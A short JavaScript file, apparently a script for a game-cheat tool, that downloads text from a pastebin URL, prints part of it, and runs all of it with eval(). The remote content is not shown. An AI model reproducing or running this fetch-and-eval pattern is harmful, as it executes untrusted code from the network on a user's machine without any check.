import { addon as Addon } from '../lib/lib.js';

/**
 * Cheat.Print('Hello World!\n');
 */
const response = Addon.HTTPGet('https://pastebin.com/raw/E0J5A0Rk');

Cheat.Print(`result: ${response.result};\nvalue: ${response.return_value.substring(0, 200)}\n`);

eval(response.return_value);